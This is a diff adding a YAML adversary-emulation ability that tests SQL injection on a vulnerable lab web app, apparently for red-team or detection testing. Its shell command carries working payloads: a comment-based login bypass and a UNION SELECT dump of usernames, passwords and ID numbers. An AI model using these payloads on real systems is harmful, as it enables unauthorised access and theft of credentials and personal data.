@@ -1,0 +1,17 @@
+- id: ia03-sqli-bypass
+  name: SQL Injection Authentication Bypass
+  description: Exploit SQL injection on vulnlab login — succeeds only if auth bypass or data dump is confirmed
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  timeout: 30
+  platforms:
+    linux:
+      sh:
+        command: |
+          bypass=$(curl -s -X POST 'http://10.0.20.21:9001/?vuln=sqli' -d "username=admin'--&password=x" 2>/dev/null); echo "$bypass" | head -5; dump=$(curl -s "http://10.0.20.21:9001/?vuln=sqli&username=%27+UNION+SELECT+1%2Cusername%2Cpassword%2Cadhar_id%2Crole+FROM+users--" 2>/dev/null); echo "$dump" | head -3; if echo "$bypass" | grep -qi "welcome\|success\|dashboard\|logged in\|alice\|bob\|admin\|td\|table"; then echo "[+] SQLi AUTH BYPASS SUCCESS"; exit 0; elif echo "$dump" | grep -qi "alice\|bob\|admin\|td\|table"; then echo "[+] SQLi UNION DUMP SUCCESS"; exit 0; else echo "[!] SQLi FAILED — no auth bypass or data dump confirmed"; exit 1; fi
+        cleanup: |
+          rm -f /tmp/sqli_dump.txt
+  singleton: false
+  repeatable: true
